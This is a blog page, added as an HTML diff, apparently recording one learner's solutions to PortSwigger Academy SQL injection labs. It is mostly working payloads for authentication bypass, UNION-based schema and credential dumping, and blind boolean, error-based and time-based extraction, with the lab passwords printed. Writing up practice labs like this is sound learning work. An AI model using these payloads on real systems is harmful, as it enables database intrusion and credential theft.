@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Postswigger Server Based Attacks - SQLi | Lets Learn Together</title>
+<meta name="keywords" content="PortSwigger">
+<meta name="description" content="Different SQLi Methods Lab 1: https://0aab00d603b57c2084c1bee800e900c4.web-security-academy.net/filter?category=Gifts&#39;&#43;OR&#43;1=1-- Lab 2: administrator&#39;-- Lab 3: USERNAME: carlos administrator wiener PASSWORD: r5h2o8l8ebgh9t8qppua fppcw9cmla9y2g8ogewn p85707uom2jve88xzdqe Query: &lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;stockCheck&gt;&lt;productId&gt;1 &lt;/productId&gt;&lt;storeId&gt;&lt;@hex_entities&gt;1 UNION SELECT USERNAME FROM USERS&lt;@/hex_entities&gt;&lt;/storeId&gt;&lt;/stockCheck&gt; &lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;stockCheck&gt;&lt;productId&gt;1 &lt;/productId&gt;&lt;storeId&gt;&lt;@hex_entities&gt;1 UNION SELECT PASSWORD FROM USERS&lt;@/hex_entities&gt;&lt;/storeId&gt;&lt;/stockCheck&gt; Other Solution:
+SQL | Concatenation Operator So the command is = SELECT USERNAME || &lsquo;~&rsquo; || PASSWORD FROM USER
+Lesson Learned: If select * doesn&rsquo;t work, then try enumerating the column names in SQLi">
+<meta name="author" content="d31ty">
+<link rel="canonical" href="https://d31ty.github.io/portswigger/server-based/sqli/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.0648e40516ba181e370a81d24ab5a4b0683e67184fe1e7888524d0b7332ed31e.css" integrity="sha256-BkjkBRa6GB43CoHSSrWksGg&#43;ZxhP4eeIhSTQtzMu0x4=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://d31ty.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://d31ty.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://d31ty.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://d31ty.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://d31ty.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Postswigger Server Based Attacks - SQLi" />
+<meta property="og:description" content="Different SQLi Methods Lab 1: https://0aab00d603b57c2084c1bee800e900c4.web-security-academy.net/filter?category=Gifts&#39;&#43;OR&#43;1=1-- Lab 2: administrator&#39;-- Lab 3: USERNAME: carlos administrator wiener PASSWORD: r5h2o8l8ebgh9t8qppua fppcw9cmla9y2g8ogewn p85707uom2jve88xzdqe Query: &lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;stockCheck&gt;&lt;productId&gt;1 &lt;/productId&gt;&lt;storeId&gt;&lt;@hex_entities&gt;1 UNION SELECT USERNAME FROM USERS&lt;@/hex_entities&gt;&lt;/storeId&gt;&lt;/stockCheck&gt; &lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;stockCheck&gt;&lt;productId&gt;1 &lt;/productId&gt;&lt;storeId&gt;&lt;@hex_entities&gt;1 UNION SELECT PASSWORD FROM USERS&lt;@/hex_entities&gt;&lt;/storeId&gt;&lt;/stockCheck&gt; Other Solution:
+SQL | Concatenation Operator So the command is = SELECT USERNAME || &lsquo;~&rsquo; || PASSWORD FROM USER
+Lesson Learned: If select * doesn&rsquo;t work, then try enumerating the column names in SQLi" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://d31ty.github.io/portswigger/server-based/sqli/" /><meta property="article:section" content="PortSwigger" />
+<meta property="article:published_time" content="2023-10-15T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-10-15T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Postswigger Server Based Attacks - SQLi"/>
+<meta name="twitter:description" content="Different SQLi Methods Lab 1: https://0aab00d603b57c2084c1bee800e900c4.web-security-academy.net/filter?category=Gifts&#39;&#43;OR&#43;1=1-- Lab 2: administrator&#39;-- Lab 3: USERNAME: carlos administrator wiener PASSWORD: r5h2o8l8ebgh9t8qppua fppcw9cmla9y2g8ogewn p85707uom2jve88xzdqe Query: &lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;stockCheck&gt;&lt;productId&gt;1 &lt;/productId&gt;&lt;storeId&gt;&lt;@hex_entities&gt;1 UNION SELECT USERNAME FROM USERS&lt;@/hex_entities&gt;&lt;/storeId&gt;&lt;/stockCheck&gt; &lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;stockCheck&gt;&lt;productId&gt;1 &lt;/productId&gt;&lt;storeId&gt;&lt;@hex_entities&gt;1 UNION SELECT PASSWORD FROM USERS&lt;@/hex_entities&gt;&lt;/storeId&gt;&lt;/stockCheck&gt; Other Solution:
+SQL | Concatenation Operator So the command is = SELECT USERNAME || &lsquo;~&rsquo; || PASSWORD FROM USER
+Lesson Learned: If select * doesn&rsquo;t work, then try enumerating the column names in SQLi"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "PortSwigger",
+      "item": "https://d31ty.github.io/portswigger/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Postswigger Server Based Attacks - SQLi",
+      "item": "https://d31ty.github.io/portswigger/server-based/sqli/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Postswigger Server Based Attacks - SQLi",
+  "name": "Postswigger Server Based Attacks - SQLi",
+  "description": "Different SQLi Methods Lab 1: https://0aab00d603b57c2084c1bee800e900c4.web-security-academy.net/filter?category=Gifts\u0026#39;+OR+1=1-- Lab 2: administrator\u0026#39;-- Lab 3: USERNAME: carlos administrator wiener PASSWORD: r5h2o8l8ebgh9t8qppua fppcw9cmla9y2g8ogewn p85707uom2jve88xzdqe Query: \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\u0026lt;stockCheck\u0026gt;\u0026lt;productId\u0026gt;1 \u0026lt;/productId\u0026gt;\u0026lt;storeId\u0026gt;\u0026lt;@hex_entities\u0026gt;1 UNION SELECT USERNAME FROM USERS\u0026lt;@/hex_entities\u0026gt;\u0026lt;/storeId\u0026gt;\u0026lt;/stockCheck\u0026gt; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\u0026lt;stockCheck\u0026gt;\u0026lt;productId\u0026gt;1 \u0026lt;/productId\u0026gt;\u0026lt;storeId\u0026gt;\u0026lt;@hex_entities\u0026gt;1 UNION SELECT PASSWORD FROM USERS\u0026lt;@/hex_entities\u0026gt;\u0026lt;/storeId\u0026gt;\u0026lt;/stockCheck\u0026gt; Other Solution:\nSQL | Concatenation Operator So the command is = SELECT USERNAME || \u0026lsquo;~\u0026rsquo; || PASSWORD FROM USER\nLesson Learned: If select * doesn\u0026rsquo;t work, then try enumerating the column names in SQLi",
+  "keywords": [
+    "PortSwigger"
+  ],
+  "articleBody": "Different SQLi Methods Lab 1: https://0aab00d603b57c2084c1bee800e900c4.web-security-academy.net/filter?category=Gifts'+OR+1=1-- Lab 2: administrator'-- Lab 3: USERNAME: carlos administrator wiener PASSWORD: r5h2o8l8ebgh9t8qppua fppcw9cmla9y2g8ogewn p85707uom2jve88xzdqe Query: \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e1 \u003c@hex_entities\u003e1 UNION SELECT USERNAME FROM USERS\u003c@/hex_entities\u003e \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e1 \u003c@hex_entities\u003e1 UNION SELECT PASSWORD FROM USERS\u003c@/hex_entities\u003e Other Solution:\nSQL | Concatenation Operator So the command is = SELECT USERNAME || ‘~’ || PASSWORD FROM USER\nLesson Learned: If select * doesn’t work, then try enumerating the column names in SQLi\nExamining the Database: Type and DB Version Lab 4: '+UNION+SELECT+BANNER,+NULL+FROM+v$version-- '+UNION+SELECT+'abc','def'+FROM+dual-- Lab 5: '+UNION+SELECT+@@version,+NULL# Lab 6: Command Used in Order: 1. '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- 2. '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables+WHERE+table_name='users_qubofo'-- 3. +UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_qubofo'-- 4. '+UNION+SELECT+username_kyyuna,password_oqqqlr+FROM+users_qubofo-- Lab 7: 1. Pets'+UNION+SELECT+banner,+NULL+FROM+v$version-- 2. Pets'+UNION+SELECT+TABLE_NAME,+NULL+FROM+all_tables-- 3. Pets'+UNION+SELECT+COLUMN_NAME,NULL+FROM+all_tab_columns+WHERE+table_name+%3d+'USERS_NONJYH'+-- 4. Pets'+UNION+SELECT+PASSWORD_EXZTUS,USERNAME_QLDKXB+FROM+USERS_NONJYH-- SQLi Union Attacks Lab 8: '+UNION+SELECT+NULL,NULL,NULL-- Lab 9: '+UNION+SELECT+NULL,'7GGmn4',NULL-- Lab 10: ' UNION SELECT username, password FROM users-- administrator: 8o6kq54jl24imiyzzk0b Retrieving multiple values within a single column Lab 11: '+UNION+SELECT+NULL,username+||+'~'+||+password+FROM+users-- administrator: ce9rlx1bhleviznzn0bi Blind SQLi Attacks Lab 12: '+AND+(SELECT+username+FROM+Users+WHERE+Username+%3d+'administrator'+AND+LENGTH(password)=20)='administrator'--; –\u003eFound password length to be 20 chars, With Brute force at +1 and f Password for Admin '+AND+SUBSTRING((SELECT+Password+FROM+Users+WHERE+Username+%3d+'administrator'),+1,+1)+=+'f; administrator: f85j8tx4cnua3jqa28pi Error-Based Blind SQLi Attacks Lab 13: –\u003eFound password length to be 20 chars, With Brute force at 40 +||+(SELECT+CASE+WHEN+(1%3d1)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+where+username='administrator'+AND+LENGTH(password)\u003e§40§)+||+'' Password for Admin '+||+(SELECT+CASE+WHEN+(1%3d1)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+where+username='administrator'+AND+SUBSTR(password,1,1)='2')+||+ administrator: 2ukoj4td2zvkaqh1dmyv Lab 14: Cookie: TrackingId='AND 1=CAST((SELECT password FROM users LIMIT 1) AS int) --; administrator: jmemf0pclmffjxgz7g4u Reference Video: https://www.youtube.com/watch?v=uTS1jXjPEMU\nTime-Based SQLi Attacks Lab 15: '+||+(SELECT+pg_sleep(10))--+ Lab 16: Confirming Postgresql DB '+||+(SELECT+pg_sleep(10))--+ –\u003eFound password length to be 20 chars, With Brute force at 2 '+||+(SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTR(password,1,1)='2')+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END+FROM+users)--+ administrator: axccyutitlo85hdnxew8 ",
+  "wordCount" : "238",
+  "inLanguage": "en",
+  "datePublished": "2023-10-15T00:00:00Z",
+  "dateModified": "2023-10-15T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "d31ty"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://d31ty.github.io/portswigger/server-based/sqli/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Lets Learn Together",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://d31ty.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://d31ty.github.io/" accesskey="h" title="Lets Learn Together (Alt + H)">Lets Learn Together</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://d31ty.github.io/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://d31ty.github.io/htb/" title="Hack The Box">
+                    <span>HTB</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://d31ty.github.io/portswigger/" title="PortSwigger">
+                    <span>PortSwigger</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://d31ty.github.io/thm/" title="Try Hack Me">
+                    <span>THM</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title">
+      Postswigger Server Based Attacks - SQLi
+    </h1>
+    <div class="post-meta"><span title='2023-10-15 00:00:00 +0000 UTC'>October 15, 2023</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;d31ty
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="different-sqli-methods">Different SQLi Methods<a hidden class="anchor" aria-hidden="true" href="#different-sqli-methods">#</a></h1>
+<h2 id="lab-1">Lab 1:<a hidden class="anchor" aria-hidden="true" href="#lab-1">#</a></h2>
+<pre tabindex="0"><code>https://0aab00d603b57c2084c1bee800e900c4.web-security-academy.net/filter?category=Gifts&#39;+OR+1=1--
+</code></pre><h2 id="lab-2">Lab 2:<a hidden class="anchor" aria-hidden="true" href="#lab-2">#</a></h2>
+<pre tabindex="0"><code>administrator&#39;--
+</code></pre><h2 id="lab-3">Lab 3:<a hidden class="anchor" aria-hidden="true" href="#lab-3">#</a></h2>
+<pre tabindex="0"><code>USERNAME:
+	carlos
+	administrator
+	wiener
+PASSWORD:
+	r5h2o8l8ebgh9t8qppua
+	fppcw9cmla9y2g8ogewn
+	p85707uom2jve88xzdqe
+
+Query: 
+&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;stockCheck&gt;&lt;productId&gt;1 &lt;/productId&gt;&lt;storeId&gt;&lt;@hex_entities&gt;1 UNION SELECT USERNAME FROM USERS&lt;@/hex_entities&gt;&lt;/storeId&gt;&lt;/stockCheck&gt;
+
+&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;stockCheck&gt;&lt;productId&gt;1 &lt;/productId&gt;&lt;storeId&gt;&lt;@hex_entities&gt;1 UNION SELECT PASSWORD FROM USERS&lt;@/hex_entities&gt;&lt;/storeId&gt;&lt;/stockCheck&gt;
+</code></pre><p>Other Solution:</p>
+<h1 id="sql--concatenation-operator">SQL | Concatenation Operator<a hidden class="anchor" aria-hidden="true" href="#sql--concatenation-operator">#</a></h1>
+<p><img loading="lazy" src="/images/Portswigger-SQLi/sqli.png" alt="sqli"  />
+</p>
+<p>So the command is = <strong>SELECT USERNAME || &lsquo;~&rsquo; || PASSWORD FROM USER</strong></p>
+<h3 id="lesson-learned">Lesson Learned:<a hidden class="anchor" aria-hidden="true" href="#lesson-learned">#</a></h3>
+<p>If <code>select *</code> doesn&rsquo;t work, then try enumerating the column names in SQLi</p>
+<h1 id="examining-the-database">Examining the Database:<a hidden class="anchor" aria-hidden="true" href="#examining-the-database">#</a></h1>
+<h3 id="type-and-db-version">Type and DB Version<a hidden class="anchor" aria-hidden="true" href="#type-and-db-version">#</a></h3>
+<h2 id="lab-4">Lab 4:<a hidden class="anchor" aria-hidden="true" href="#lab-4">#</a></h2>
+<pre tabindex="0"><code>&#39;+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+
+&#39;+UNION+SELECT+&#39;abc&#39;,&#39;def&#39;+FROM+dual--
+</code></pre><h2 id="lab-5">Lab 5:<a hidden class="anchor" aria-hidden="true" href="#lab-5">#</a></h2>
+<pre tabindex="0"><code>&#39;+UNION+SELECT+@@version,+NULL#
+</code></pre><h2 id="lab-6">Lab 6:<a hidden class="anchor" aria-hidden="true" href="#lab-6">#</a></h2>
+<pre tabindex="0"><code>Command Used in Order:
+1. &#39;+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- 
+2. &#39;+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables+WHERE+table_name=&#39;users_qubofo&#39;--
+3. +UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name=&#39;users_qubofo&#39;--
+4. &#39;+UNION+SELECT+username_kyyuna,password_oqqqlr+FROM+users_qubofo--
+</code></pre><h2 id="lab-7">Lab 7:<a hidden class="anchor" aria-hidden="true" href="#lab-7">#</a></h2>
+<pre tabindex="0"><code>1. Pets&#39;+UNION+SELECT+banner,+NULL+FROM+v$version--
+2. Pets&#39;+UNION+SELECT+TABLE_NAME,+NULL+FROM+all_tables--
+3. Pets&#39;+UNION+SELECT+COLUMN_NAME,NULL+FROM+all_tab_columns+WHERE+table_name+%3d+&#39;USERS_NONJYH&#39;+--
+4. Pets&#39;+UNION+SELECT+PASSWORD_EXZTUS,USERNAME_QLDKXB+FROM+USERS_NONJYH--
+</code></pre><h1 id="sqli-union-attacks">SQLi Union Attacks<a hidden class="anchor" aria-hidden="true" href="#sqli-union-attacks">#</a></h1>
+<h2 id="lab-8">Lab 8:<a hidden class="anchor" aria-hidden="true" href="#lab-8">#</a></h2>
+<pre tabindex="0"><code>&#39;+UNION+SELECT+NULL,NULL,NULL--
+</code></pre><h2 id="lab-9">Lab 9:<a hidden class="anchor" aria-hidden="true" href="#lab-9">#</a></h2>
+<pre tabindex="0"><code>&#39;+UNION+SELECT+NULL,&#39;7GGmn4&#39;,NULL--
+</code></pre><h2 id="lab-10">Lab 10:<a hidden class="anchor" aria-hidden="true" href="#lab-10">#</a></h2>
+<pre tabindex="0"><code>&#39; UNION SELECT username, password FROM users--
+
+administrator: 8o6kq54jl24imiyzzk0b
+</code></pre><h3 id="retrieving-multiple-values-within-a-single-column">Retrieving multiple values within a single column<a hidden class="anchor" aria-hidden="true" href="#retrieving-multiple-values-within-a-single-column">#</a></h3>
+<h2 id="lab-11">Lab 11:<a hidden class="anchor" aria-hidden="true" href="#lab-11">#</a></h2>
+<pre tabindex="0"><code>&#39;+UNION+SELECT+NULL,username+||+&#39;~&#39;+||+password+FROM+users--
+
+administrator: ce9rlx1bhleviznzn0bi
+</code></pre><h1 id="blind-sqli-attacks">Blind SQLi Attacks<a hidden class="anchor" aria-hidden="true" href="#blind-sqli-attacks">#</a></h1>
+<h2 id="lab-12">Lab 12:<a hidden class="anchor" aria-hidden="true" href="#lab-12">#</a></h2>
+<pre tabindex="0"><code>&#39;+AND+(SELECT+username+FROM+Users+WHERE+Username+%3d+&#39;administrator&#39;+AND+LENGTH(password)=20)=&#39;administrator&#39;--;   
+</code></pre><h4 id="--found-password-length-to-be-20-chars-with-brute-force-at-1-and-f">&ndash;&gt;Found password length to be 20 chars, With Brute force at +1 and f<a hidden class="anchor" aria-hidden="true" href="#--found-password-length-to-be-20-chars-with-brute-force-at-1-and-f">#</a></h4>
+<h4 id="password-for-admin">Password for Admin<a hidden class="anchor" aria-hidden="true" href="#password-for-admin">#</a></h4>
+<pre tabindex="0"><code>&#39;+AND+SUBSTRING((SELECT+Password+FROM+Users+WHERE+Username+%3d+&#39;administrator&#39;),+1,+1)+=+&#39;f;
+
+administrator: f85j8tx4cnua3jqa28pi
+</code></pre><h1 id="error-based-blind-sqli-attacks">Error-Based Blind SQLi Attacks<a hidden class="anchor" aria-hidden="true" href="#error-based-blind-sqli-attacks">#</a></h1>
+<h2 id="lab-13">Lab 13:<a hidden class="anchor" aria-hidden="true" href="#lab-13">#</a></h2>
+<h4 id="--found-password-length-to-be-20-chars-with-brute-force-at-40">&ndash;&gt;Found password length to be 20 chars, With Brute force at 40<a hidden class="anchor" aria-hidden="true" href="#--found-password-length-to-be-20-chars-with-brute-force-at-40">#</a></h4>
+<pre tabindex="0"><code>+||+(SELECT+CASE+WHEN+(1%3d1)+THEN+TO_CHAR(1/0)+ELSE+&#39;&#39;+END+FROM+users+where+username=&#39;administrator&#39;+AND+LENGTH(password)&gt;§40§)+||+&#39;&#39;
+</code></pre><h4 id="password-for-admin-1">Password for Admin<a hidden class="anchor" aria-hidden="true" href="#password-for-admin-1">#</a></h4>
+<pre tabindex="0"><code>&#39;+||+(SELECT+CASE+WHEN+(1%3d1)+THEN+TO_CHAR(1/0)+ELSE+&#39;&#39;+END+FROM+users+where+username=&#39;administrator&#39;+AND+SUBSTR(password,1,1)=&#39;2&#39;)+||+
+
+administrator: 2ukoj4td2zvkaqh1dmyv
+</code></pre><h2 id="lab-14">Lab 14:<a hidden class="anchor" aria-hidden="true" href="#lab-14">#</a></h2>
+<pre tabindex="0"><code>Cookie: TrackingId=&#39;AND 1=CAST((SELECT password FROM users LIMIT 1) AS int) --; 
+
+administrator: jmemf0pclmffjxgz7g4u
+</code></pre><h5 id="reference-video">Reference Video:<a hidden class="anchor" aria-hidden="true" href="#reference-video">#</a></h5>
+<p><a href="https://www.youtube.com/watch?v=uTS1jXjPEMU">https://www.youtube.com/watch?v=uTS1jXjPEMU</a></p>
+<h1 id="time-based-sqli-attacks">Time-Based SQLi Attacks<a hidden class="anchor" aria-hidden="true" href="#time-based-sqli-attacks">#</a></h1>
+<h2 id="lab-15">Lab 15:<a hidden class="anchor" aria-hidden="true" href="#lab-15">#</a></h2>
+<pre tabindex="0"><code>&#39;+||+(SELECT+pg_sleep(10))--+
+</code></pre><h2 id="lab-16">Lab 16:<a hidden class="anchor" aria-hidden="true" href="#lab-16">#</a></h2>
+<h4 id="confirming-postgresql-db">Confirming Postgresql DB<a hidden class="anchor" aria-hidden="true" href="#confirming-postgresql-db">#</a></h4>
+<pre tabindex="0"><code>&#39;+||+(SELECT+pg_sleep(10))--+
+</code></pre><h4 id="--found-password-length-to-be-20-chars-with-brute-force-at-2">&ndash;&gt;Found password length to be 20 chars, With Brute force at 2<a hidden class="anchor" aria-hidden="true" href="#--found-password-length-to-be-20-chars-with-brute-force-at-2">#</a></h4>
+<pre tabindex="0"><code>&#39;+||+(SELECT+CASE+WHEN+(username=&#39;administrator&#39;+AND+SUBSTR(password,1,1)=&#39;2&#39;)+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END+FROM+users)--+
+
+administrator: axccyutitlo85hdnxew8
+</code></pre>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://d31ty.github.io/tags/portswigger/">PortSwigger</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://d31ty.github.io/">Lets Learn Together</a></span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
